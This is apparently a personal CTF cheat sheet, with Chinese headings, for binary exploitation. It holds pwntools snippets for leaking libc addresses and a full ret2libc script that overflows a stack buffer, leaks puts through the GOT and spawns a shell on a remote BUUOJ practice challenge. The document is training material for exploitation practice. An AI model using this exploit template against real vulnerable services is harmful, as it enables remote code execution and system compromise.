64位:
`puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))`

all arch:
```py
def leak_address():
	if(context.arch=='i386'): 
		return u32(p.recv(4)) 
	else :
		return u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
```

```py
from pwn import *
from LibcSearcher import *

context(os="linux",arch="amd64",log_level="debug")
# p = process("./hacknote",env={"LD_PRELOAD":"./glibc/2-23/32/libc-2.23.so"})
# p = process("./pwn")
p = remote("node5.buuoj.cn",28594)
elf = ELF("./pwn")
# libc = ELF("./glibc/2-23/32/libc-2.23.so")

ret_addr  = 0x400506
pop_rdi   = 0x400763
main_addr = 0x400698
puts_got  = elf.got['puts']
puts_plt  = elf.plt['puts']

payload1 = b"a"*0x20 + b'b'*0x8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter("Show me your magic again\n",payload1)
puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc = LibcSearcher("puts",puts_addr)

offset = puts_addr - libc.dump("puts")
sys_addr = offset + libc.dump("system")
bin_sh   = offset + libc.dump("str_bin_sh")

payload2 = b'a'*0x20 + b'b'*0x8 + p64(ret_addr) + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr) + p64(0xdeadbeef)
p.sendlineafter("Show me your magic again\n",payload2)
p.interactive()


```







## 泄露libc，本地有libc文件

```python
libc_base = puts_addr - libc.sym['puts']
sys_addr = libc_base + libc.sym['system']
bin_sh = libc_base +  next(libc.search(b"/bin/sh\x00"))
```



## 无本地libc

```python
libc = LibcSearcher("write",write_addr)

libcbase = write_addr - libc.dump("write")
system = libcbase + libc.dump("system")
binsh = libcbase + libc.dump("str_bin_sh")
```

